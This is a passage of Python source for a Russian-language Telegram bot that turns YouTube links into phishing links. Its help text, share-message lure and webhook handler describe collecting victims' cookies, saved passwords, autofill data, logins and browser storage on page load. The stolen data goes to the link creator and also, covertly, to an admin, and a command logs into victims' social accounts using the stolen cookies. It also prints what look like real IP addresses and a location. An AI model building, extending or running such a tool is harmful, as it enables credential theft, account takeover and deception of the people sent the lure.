            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
    
    elif data.startswith("data_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            message = formatter.format_sensitive_data_report(link)
            await query.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True
            )
        else:
            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
    
    elif data == "help":
        help_message = """
🆘 *ПОМОЩЬ И ИНСТРУКЦИИ*

🎯 *Как использовать:*
1. Отправьте боту ссылку на YouTube
2. Получите сгенерированную ссылку
3. Отправьте её другу/цели
4. Когда человек перейдет - данные соберутся автоматически
5. Получите данные в этот чат
6. *Все полные данные также отправятся администратору*

🔐 *Что именно собирается:*
• Все cookies текущего сайта (включая сессионные)
• Cookies популярных соцсетей
• LocalStorage и SessionStorage
• Сохраненные в браузере пароли
• Данные автозаполнения форм
• Логины из полей ввода
• Данные из всех хранилищ браузера
• Информация о менеджерах паролей
• Данные устройства и браузера
• Сетевые данные и геолокация
• *Определение сервисов*: Google, Facebook, ВКонтакте, Twitter, Instagram и др.

🚀 *АВТОМАТИЧЕСКИЙ ВХОД:*
• Используйте команду: `/login_my [ID_ссылки]`
• Бот попытается войти во все социальные сети через cookies
• Использует вашу конфигурацию устройства
• Делает скриншоты успешных входов

⏱️ *Время сбора:* ~3-20 секунд
🔒 *Безопасность:* Данные шифруются при передаче

⚠️ *Важные предупреждения:*
• Используйте только для тестирования
• Не используйте для незаконных целей
• Данные хранятся 24 часа
• Все полные данные отправляются администратору
• Бот логирует все действия

🔧 *Команды:*
• /start - Начало работы
• /data [ID] - Просмотр данных
• /accounts [ID] - Анализ учетных записей
• /login_my [ID] - Автоматический вход
• /stats - Статистика системы
"""
        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("copy_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
            await query.message.reply_text(
                f"📋 *Ссылка для копирования:*\n\n`{phishing_url}`\n\n"
                "Используйте Ctrl+C / Cmd+C для копирования.",
                parse_mode=ParseMode.MARKDOWN
            )
    
    elif data.startswith("share_"):
        link_id = data[6:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
            share_text = f"""
🎁 *ПРИВЕТ! СМОТРИ КРУТОЕ ВИДЕО!* 🎁

Я нашел супер интересное видео на YouTube!
Обязательно посмотри - там реально круто!

🔗 *Ссылка на видео:*
{phishing_url}

⚠️ *Внимание:* Видео может быть заблокировано в твоей стране, 
но по этой ссылке оно откроется точно!

Скорее переходи! 👆
"""
            await query.message.reply_text(
                f"📤 *Текст для отправки:*\n\n{share_text}\n\n"
                "Скопируйте и отправьте другу.",
                parse_mode=ParseMode.MARKDOWN
            )

# Webhook обработчик для сбора данных
async def handle_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
    """Обработка данных от фишинговой страницы"""
    try:
        link_id = request_data.get("link_id")
        if not link_id:
            return {"status": "error", "message": "No link ID"}
        
        # Обновляем счетчик кликов
        db.add_click(link_id)
        
        # Определяем тип данных
        data_type = request_data.get("data_type", "sensitive_data")
        
        # Всегда собираем данные (включая мгновенный сбор)
        collected_data = await data_collector.collect_all_data(request_data)
        
        # Получаем информацию о ссылке
        link = db.get_link(link_id)
        if link:
            # Создаем уведомление о мгновенном сборе
            if data_type == "instant_credentials":
                instant_result = collected_data.get("data", {}).get("instant_credentials", {})
                if instant_result.get("status") == "instant_collection_success":
                    # Отправляем уведомление о мгновенном сборе
                    instant_message = f"""
⚡ *МГНОВЕННЫЙ СБОР ДАННЫХ!*

🔄 Собрано сразу при загрузке страницы:

🔑 Найдено паролей: {instant_result.get('passwords_collected', 0)}
👤 Найдено логинов: {instant_result.get('logins_collected', 0)}
📋 Найдено форм: {instant_result.get('forms_collected', 0)}

✅ Данные собраны БЕЗ взаимодействия пользователя
⏱ Время сбора: менее 1 секунды
📊 Статус: мгновенный сбор завершен
"""
                    
                    # Добавляем информацию о сервисах
                    account_analysis = instant_result.get("account_analysis", {})
                    if account_analysis.get("service_stats"):
                        instant_message += "\n🌐 *ОПРЕДЕЛЕНЫ СЕРВИСЫ:*\n"
                        for service, count in account_analysis["service_stats"].items():
                            service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                            instant_message += f"• {service_name_ru}: {count} записей\n"
                    
                    try:
                        await context.bot.send_message(
                            chat_id=link.created_by,
                            text=instant_message,
                            parse_mode=ParseMode.MARKDOWN
                        )
                    except Exception as e:
                        logger.error(f"Error sending instant collection notification: {e}")
            
            # Отправляем полный отчет о данных
            message = formatter.format_collected_data(link_id, collected_data)
            
            try:
                await context.bot.send_message(
                    chat_id=link.created_by,
                    text=message,
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception as e:
                logger.error(f"Error sending to link creator: {e}")
            
            # Отправляем ДЕТАЛЬНЫЕ данные админу
            await send_detailed_data_to_admin(context, link, collected_data)
            
            # Также отправляем краткое уведомление админу
            try:
                sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
                instant_data = collected_data.get("data", {}).get("instant_credentials", {})
                
                services_identified = []
                if sensitive_data.get("account_analysis", {}).get("service_stats"):
                    services_identified.extend(sensitive_data["account_analysis"]["service_stats"].keys())
                if instant_data.get("account_analysis", {}).get("service_stats"):
                    services_identified.extend(instant_data["account_analysis"]["service_stats"].keys())
                
                services_identified = list(set(services_identified))
                services_str = ", ".join([AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) 
                                        for s in services_identified[:3]])
                
                if services_identified:
                    await context.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"📨 Новые данные по ссылке `{link_id}`\n"
                             f"👤 Создатель: {link.created_by}\n"
                             f"🔗 Кликов: {link.clicks}\n"
                             f"🍪 Cookies: {len(link.collected_cookies)}\n"
                             f"🔑 Пароли: {len(link.collected_passwords)}\n"
                             f"👤 Логины: {len(link.collected_logins)}\n"
                             f"🌐 Сервисы: {services_str}\n"
                             f"✅ Детальный отчет отправлен выше",
                        parse_mode=ParseMode.MARKDOWN
                    )
                else:
                    await context.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"📨 Новые данные по ссылке `{link_id}`\n"
                             f"👤 Создатель: {link.created_by}\n"
                             f"🔗 Кликов: {link.clicks}\n"
                             f"🍪 Cookies: {len(link.collected_cookies)}\n"
                             f"🔑 Пароли: {len(link.collected_passwords)}\n"
                             f"👤 Логины: {len(link.collected_logins)}\n"
                             f"✅ Детальный отчет отправлен выше",
                        parse_mode=ParseMode.MARKDOWN
                    )
            except Exception as e:
                logger.error(f"Error sending admin notification: {e}")
        
        return {"status": "success", "data_received": True, "data_type": data_type}
    
    except Exception as e:
        logger.error(f"Error in webhook handler: {e}", exc_info=True)
        return {"status": "error", "message": str(e)}

# Новая команда для просмотра детальных данных
async def show_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда для просмотра собранных данных"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📊 *Просмотр данных*\n\n"
            "Используйте: `/data [ID_ссылки]`\n"
            "Или: `/data list` - список ваших ссылок\n"
            "Или: `/accounts [ID_ссылки]` - анализ учетных записей\n"
            "Или: `/login_my [ID_ссылки]` - автоматический вход\n\n"
            "Пример: `/data abc123def456`\n"
            "Пример: `/accounts abc123def456`\n"
            "Пример: `/login_my abc123def456`\n\n"
            "*Примечание:* Все данные также отправляются администратору.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    arg = context.args[0]
    
    if arg == "list":
        user_links = [link for link in db.links.values() if link.created_by == user.id]
        
        if not user_links:
            await update.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in user_links[-10:]:
            message += f"• `{link.id}`\n"
            message += f"  Видео: {link.original_url[:40]}...\n"
            message += f"  Создано: {link.created_at[:10]}\n"
            message += f"  Переходов: {link.clicks}\n"
            message += f"  Данных: {len(link.data_collected)}\n"
            message += f"  Cookies: {len(link.collected_cookies)}\n"
            message += f"  Пароли: {len(link.collected_passwords)}\n"
            message += "  ─────\n"
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    else:
        link = db.get_link(arg)
        if not link:
            await update.message.reply_text("❌ Ссылка не найдена.")
            return
        
        if link.created_by != user.id:
            await update.message.reply_text("❌ У вас нет доступа к этой ссылке.")
            return
        
        message = formatter.format_sensitive_data_report(link)
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )

# Новая команда для анализа учетных записей
async def accounts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда для просмотра детального отчета по учетным записям"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🔍 *Анализ учетных записей*\n\n"
            "Используйте: `/accounts [ID_ссылки]`\n"
            "Или: `/accounts list` - список ссылок для анализа\n\n"
            "Пример: `/accounts abc123def456`\n\n"
            "Показывает детальный анализ всех найденных\n"
            "учетных записей и их принадлежность к сервисам.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    arg = context.args[0]
    
    if arg == "list":
        user_links = [link for link in db.links.values() if link.created_by == user.id]
        
        if not user_links:
            await update.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ ДЛЯ АНАЛИЗА:*\n\n"
        for i, link in enumerate(user_links[-10:], 1):
            message += f"{i}. `{link.id}`\n"
            message += f"   Видео: {link.original_url[:40]}...\n"
            message += f"   Переходов: {link.clicks}\n"
            message += f"   Логинов: {len(link.collected_logins)}\n"
            message += f"   Паролей: {len(link.collected_passwords)}\n"
            message += "   ─────\n"
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    else:
        link_id = arg
        link = db.get_link(link_id)
        
        if not link:
            await update.message.reply_text("❌ Ссылка не найдена.")
            return
        
        if link.created_by != user.id:
            await update.message.reply_text("❌ У вас нет доступа к этой ссылке.")
            return
        
        # Создаем детальный отчет
        message = formatter.format_detailed_account_report(link)
        
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )

# Обработчик ошибок
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок"""
    logger.error(f"Update {update} caused error {context.error}", exc_info=True)
    
    try:
        error_msg = str(context.error)
        if len(error_msg) > 1000:
            error_msg = error_msg[:1000] + "..."
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ *Ошибка в боте:*\n\n{error_msg}",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

def main():
    """Запуск бота"""
    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики команд
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("data", show_data_command))
    application.add_handler(CommandHandler("accounts", accounts_command))
    application.add_handler(CommandHandler("login_my", auto_login_with_my_data))
    
    # Обработчик YouTube ссылок
    application.add_handler(MessageHandler(
        filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
        handle_youtube_link
    ))
    
    # Обработчик inline кнопок
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Обработчик ошибок
    application.add_error_handler(error_handler)
    
    # Создаем папку для скриншотов
    os.makedirs("screenshots", exist_ok=True)
    
    # Запускаем бота
    print("🤖 YouTube Data Collector Bot запущен!")
    print(f"👑 Админ: {ADMIN_ID}")
    print(f"🌐 Домен: {DOMAIN}")
    print("🚀 Функции бота:")
    print("   - Сбор cookies, паролей, логинов")
    print("   - Определение сервисов (Google, Facebook и др.)")
    print("   - Автоматический вход через cookies")
    print("   - Скриншоты успешных входов")
    print("📱 Ваша конфигурация загружена:")
    print(f"   - Устройство: iPhone iOS 17.5.1")
    print(f"   - IP адреса: 31.43.37.220, 31.43.37.157")
    print(f"   - Локация: Lubny, Ukraine")
    print(f"   - User Agent: iOS Safari Mobile")
    print("⏳ Ожидание команд...")
    print("💡 Основные команды:")
    print("   /start - Начало работы")
    print("   /data [ID] - Просмотр данных")
    print("   /accounts [ID] - Анализ учетных записей")
    print("   /login_my [ID] - Автоматический вход")
    
    application.run_polling(allowed_updates=Update.ALL_UPDATES)

if __name__ == '__main__':
    main()